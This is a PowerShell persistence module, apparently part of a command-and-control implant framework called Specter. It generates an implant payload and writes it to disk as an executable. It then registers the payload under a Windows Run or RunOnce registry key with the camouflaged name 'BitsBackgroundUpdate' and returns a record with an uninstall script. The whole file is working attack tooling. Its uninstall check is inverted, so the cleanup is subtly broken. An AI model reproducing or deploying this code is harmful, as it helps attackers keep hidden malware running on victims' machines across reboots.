param(
    [Parameter(Mandatory = $true, HelpMessage = "The name of the registry key entry.")]
    [ValidateNotNullOrEmpty()]
    [string]$Name = 'BitsBackgroundUpdate',

    [Parameter(Mandatory = $true, HelpMessage = "The name of the environment variable to store the PowerShell payload.")]
    [ValidateNotNullOrEmpty()]
    [string]$EnvironmentVariableName = 'BitsBackgroundParams',

    [Parameter(Mandatory = $true, HelpMessage = "The type of registry key persistence.")]
    [ValidateSet('CurrentUserRun', 'CurrentUserRunOnce', 'SystemRun', 'SystemRunOnce')]
    [string]$RunKey = 'CurrentUserRun',

    [Parameter(Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [ValidateNotNullOrEmpty()]
    [Build]
    [string]$Build,

    [Parameter(Mandatory = $true, HelpMessage = "The type of payload to drop.")]
    [ValidateSet("csharp_load_module", "csharp_powershell_host", "ps_command")]
    [string]$Payload = "csharp_load_module"
)

try {
    #Generate a payload
    if($Payload -eq 'ps_command') {
        $command = payload -Build $Build -Kind $Payload;
    } else {
        $contents = payload -Build $Build -Kind $Payload;
        $assembly = [System.Reflection.Assembly]::Load($contents);
        $filename = $assembly.GetName();

        #Drop the payload to disk
        if($Profile -eq 'System') {
            $path = "C:\Program Files\$($filename.Name)\$($filename.Name).exe";
        } else {
            $tempfolder = [System.IO.Path]::GetTempPath();
            $path = [System.IO.Path]::Combine($tempfolder, [System.IO.Path]::Combine($filename.Name, $filename.Name + ".exe"));
        }
        $directory = [System.IO.Path]::GetDirectoryName($path);
        if(![System.IO.Directory]::Exists($directory)) {
            [void][System.IO.Directory]::CreateDirectory($directory);
        }
        [System.IO.File]::WriteAllBytes($path, $contents);
        $command = $path;
        $config = Get-CompatibilityConfig
        [System.IO.File]::WriteAllText($path + ".config", $config);
    }

	$environment = "Machine";
	$Profile = "System";
	$Trigger = "OnStartup";
	if($RunKey -like "*User*") {
		$environment = "User";
		$Profile = "User";
		$Trigger = "OnLogon";
	}
	
    $regpath = [string]::Empty;
	if($RunKey -eq "CurrentUserRun") {
		$regpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
	} elseif($RunKey -eq "CurrentUserRunOnce") {
		$regpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
	} elseif($RunKey -eq "SystemRun") {
		$regpath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
	} elseif($RunKey -eq "SystemRunOnce") {
		$regpath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
	}
	Set-ItemProperty $regpath -Name $Name -Value $Command -Force;
	$success = $true;
} catch {
	$success = $false;
	throw;
}

#Generate a persistence ID
$id = [Guid]::NewGuid().ToString().Replace("-", "");

New-Object PSObject -Property @{
	Persistence = New-Object PSObject -Property @{
		Id = $id;
		Event = "Create";
		Success = $success;
	    Method = "Run Key";
	    Profile = $Profile;
	    Trigger = $Trigger;
	    ValueName = $Name;
	    RegistryKeyPath = $regpath;
	    Command = $command;
	    Build = $Build;
	    UninstallScript = @"
try {
	Remove-ItemProperty '$regpath' -Name '$Name' -Force;
    `$path = '$path';
    if(![System.IO.File]::Exists(`$path)) {
        [System.IO.File]::Delete(`$path);
        [System.IO.File]::Delete(`$path + '.config');
    }
	`$success = `$true;
} catch {
	`$success = `$false;
	throw;
}

New-Object PSObject -Property @{
	Persistence = New-Object PSObject -Property @{
		Id = "$id";
		Event = "Delete";
		Success = `$success;
	    Method = "Run Key";
	    Profile = "$Profile";
	    Trigger = "$Trigger";
	}
}
"@;
	}
}